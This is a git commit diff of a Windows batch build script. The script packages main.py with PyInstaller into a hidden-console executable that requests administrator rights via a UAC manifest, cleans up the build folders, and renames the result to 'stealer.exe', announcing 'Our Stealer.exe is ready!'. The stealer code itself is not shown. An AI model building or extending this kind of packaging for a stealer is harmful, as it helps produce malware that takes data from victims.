015699739f8eb7ef0f45a5a251a22aeac713cae3
Lunix <cyln.elif1@gmail.com>
2024-09-21 23:29:51 +0300

    Finish to bat file!

--- build.bat
+++ build.bat
@@ -1,10 +1,40 @@
+@echo off
+echo Installing PyInstaller...
 pip install pyinstaller
+if errorlevel 1 (
+    echo Hata: PyInstaller yüklenemedi!
+    exit /b 1
+)
+
+@echo off
+echo Starting PyInstaller...
 pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest .\main.py
+if errorlevel 1 (
+    echo Hata: PyInstaller çalışmadı!
+    exit /b 1
+)
+
+echo PyInstaller Finished!
 set scriptDir=%~dp0
+cd /d "%scriptDir%dist"
+if exist main.exe (
+    move main.exe ..
+) else (
+    echo Hata: main.exe bulunamadı!
+    exit /b 1
+)
+
+cd ..
+echo Cleaning up...
+powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
 powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"
 DEL main.spec
-cd /d dist
-move main.exe ..
-cd ..
-powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
+echo Temporary files deleted!
+
 ren main.exe stealer.exe
+if errorlevel 1 (
+    echo Hata: File ren error!
+    exit /b 1
+)
+
+echo Our Stealer.exe is ready!
